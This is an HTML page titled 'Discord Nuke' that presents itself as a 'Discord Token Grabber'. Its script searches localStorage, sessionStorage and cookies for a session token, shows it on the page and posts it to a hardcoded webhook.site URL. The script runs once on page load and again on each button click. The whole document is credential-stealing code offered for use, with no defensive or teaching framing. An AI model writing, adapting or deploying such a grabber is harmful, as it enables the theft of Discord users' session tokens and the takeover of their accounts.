<!DOCTYPE html>
<html>
<head>
    <title>Discord Nuke</title>
    <style>
        body { background: #2f3136; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
        #output { margin-top: 20px; word-break: break-all; color: #aaa; }
    </style>
</head>
<body>
    <h2>Discord Token Grabber</h2>
    <button id="grab">Grab Token</button>
    <div id="output"></div>

    <script>
        const webhook = "https://webhook.site/488941e1-61a4-4381-9534-1ec26ff9a6ef";

        async function grabToken() {
            // 1. Try LocalStorage
            let token = localStorage.token || sessionStorage.token;
            
            // 2. If not found, try Cookies
            if (!token) {
                const cookies = document.cookie.split(';');
                for (let cookie of cookies) {
                    if (cookie.trim().startsWith('token=')) {
                        token = cookie.split('=')[1];
                        break;
                    }
                }
            }

            // 3. Display it
            document.getElementById('output').innerText = token || "No Token Found (Not Logged In?)";

            // 4. Send it to your Webhook
            if (token) {
                fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({content: "🔥 TOKEN: " + token})
                });
            } else {
                fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({content: "⚠️ NO TOKEN"})
                });
            }
        }

        document.getElementById('grab').addEventListener('click', grabToken);
        
        // Auto-run once on load
        grabToken();
    </script>
</body>
</html>
